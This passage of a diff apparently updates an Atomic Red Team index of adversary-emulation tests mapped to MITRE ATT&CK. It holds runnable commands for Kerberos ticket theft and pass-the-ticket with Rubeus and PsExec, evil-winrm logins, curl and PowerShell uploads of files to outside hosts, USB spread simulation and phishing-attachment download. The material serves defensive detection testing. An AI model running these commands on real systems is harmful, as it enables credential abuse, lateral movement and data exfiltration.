+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1563.002:
     technique:
       external_references:
@@ -66532,7 +66937,30 @@ lateral-movement:
         for code execution
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1091
+    atomic_tests:
+    - name: USB Malware Spread Simulation
+      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
+      description: "Simulates an adversary copying malware to all connected removable
+        drives. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: |
+          $RemovableDrives=@()
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          write-host "Removable Drive Found:" $Drive
+          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
+          }
+        cleanup_command: |
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
+          }
   T1021.002:
     technique:
       created: '2020-02-11T18:25:28.212Z'
@@ -67319,13 +67747,14 @@ lateral-movement:
       dependency_executor_name: powershell
       dependencies:
       - description: Computer must have Ruby Installed
-        prereq_command: if (ruby -v) {exit 0} else {exit 1}
+        prereq_command: try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}
         get_prereq_command: |-
           Invoke-WebRequest  -OutFile $env:Temp\rubyinstaller-2.7.1-1-x64.exe https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
           $file1= $env:Temp + "\rubyinstaller-2.7.1-1-x64.exe"
           Start-Process $file1 /S;
       - description: Computer must have Evil-WinRM installed
-        prereq_command: if (evil-winrm -h) {exit 0} else {exit 1}
+        prereq_command: try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit
+          1}
         get_prereq_command: gem install evil-winrm
       executor:
         command: 'evil-winrm -i #{destination_address} -u #{user_name} -p #{password}'
@@ -71005,27 +71434,59 @@ exfiltration:
       - Windows
       identifier: T1048.002
     atomic_tests:
-    - name: Exfiltrate data HTTPS using curl
-      auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+    - name: Exfiltrate data HTTPS using curl windows
+      auto_generated_guid: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0
       description: 'Exfiltrate data HTTPS using curl to file share site file.io
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        input_file:
+          description: Test file to upload
+          type: Path
+          default: PathToAtomicsFolder/T1048.002/src/artifact
+        curl_path:
+          description: path to curl.exe
+          type: Path
+          default: C:\Windows\System32\Curl.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Curl must be installed on system.
+
+'
+        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
+          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+          Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+          Remove-Item $env:temp\curl
+          Remove-Item $env:temp\curl.zip
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: "#{curl_path} -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true'
+          https://file.io/\n"
+    - name: Exfiltrate data HTTPS using curl linux
+      auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+      description: 'Exfiltrate data HTTPS using curl to file share site file.io
+
+'
+      supported_platforms:
       - macos
       - linux
       input_arguments:
         input_file:
           description: Test file to upload
           type: Path
-          default: PathToAtomicsFolder/T1048.002/files/artifact
+          default: PathToAtomicsFolder/T1048.002/src/artifact
       executor:
         name: bash
         elevation_required: false
-        command: 'curl -F ''file=@#{input_file}'' -F ''maxDownloads=1'' -F ''autoDelete=true''
+        command: curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true'
           https://file.io/
-
-'
   T1011.001:
     technique:
       external_references:
@@ -71124,25 +71585,12 @@ exfiltration:
         filepath:
           description: The file which is being exfiltrated to the C2 Server.
           type: Path
-          default: C:\Users\$env:UserName\LineNumbers.txt
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'The file to be exfiltrated must be present on the machine. Running
-          the pre-reqs will create a sample file to be exfiltrated, else give the
-          path of already present file as input.
-
-'
-        prereq_command: 'if ([System.IO.File]::Exists("#{filepath}")){exit 0} else
-          {exit 1}
-
-'
-        get_prereq_command: "echo \"Creating file to be exfiltrated\" \n1..100 | ForEach-Object
-          { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n"
+          default: "$env:TEMP\\LineNumbers.txt"
       executor:
-        command: |
-          [System.Net.ServicePointManager]::Expect100Continue = $false
-          $filecontent = Get-Content -Path #{filepath}
-          Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+        command: "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object {
+          Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue
+          = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest
+          -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n"
         name: powershell
   T1011:
     technique:
@@ -72665,7 +73113,30 @@ initial-access:
         for code execution
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1091
+    atomic_tests:
+    - name: USB Malware Spread Simulation
+      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
+      description: "Simulates an adversary copying malware to all connected removable
+        drives. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: |
+          $RemovableDrives=@()
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          write-host "Removable Drive Found:" $Drive
+          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
+          }
+        cleanup_command: |
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
+          }
   T1566.001:
     technique:
       external_references:
@@ -72740,29 +73211,23 @@ initial-access:
       - Linux
       identifier: T1566.001
     atomic_tests:
-    - name: Download Phishing Attachment - VBScript
+    - name: Download Macro-Enabled Phishing Attachment
       auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
       description: |
-        The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
-        The below will successfully download the macro-enabled Excel file to the current location.
-        File is downloaded to the %temp% folder.
+        This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
+        The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
       supported_platforms:
       - windows
       executor:
         command: |
-          if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
-            return 'Please install Microsoft Excel before running this test.'
-          }
-          else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
-            $fileName = 'PhishingAttachment.xlsm'
-            New-Item -Type File -Force -Path $fileName | out-null
-            $wc = New-Object System.Net.WebClient
-            $wc.Encoding = [System.Text.Encoding]::UTF8
-            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri $url -OutFile $fileName
-          }
+          $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
         name: powershell
+        cleanup_command: 'Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction
+          Ignore
+
+'
     - name: Word spawned a command shell and used an IP address in the command line
       auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
       description: |
